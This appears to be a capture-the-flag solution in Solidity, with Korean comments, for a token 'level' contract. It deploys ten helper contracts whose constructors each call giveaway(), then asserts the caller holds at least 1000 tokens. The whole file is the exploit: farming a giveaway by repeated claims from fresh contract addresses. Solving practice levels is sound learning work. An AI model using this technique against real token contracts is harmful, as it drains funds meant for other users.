// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// 인터페이스에서 얘네 두 외부 함수 갖고 오기 
interface LevelInterface {
  function amoTokenBalance(address) external returns (uint);
  function giveaway() external;
}

contract SolveInternal {
	//주소를 받아서 주소를 가진 컨트랙트의 giveaway 호출 
  constructor(address addr) {
    LevelInterface level = LevelInterface(addr);
    level.giveaway();
  }
}

contract Solve {
  constructor (address addr) {
	  // 10번 반복해서 컨트랙트 10개 생성 
    for (uint i = 0; i < 10; i++) {
      new SolveInternal(addr);
    }

		//level로 두 외부 함수 가져오기 
    LevelInterface level = LevelInterface(addr);
    //msg.sender에 amoTokenBalance 실행 
    uint balance = level.amoTokenBalance(msg.sender);
    assert(balance >= 1000);
  }
}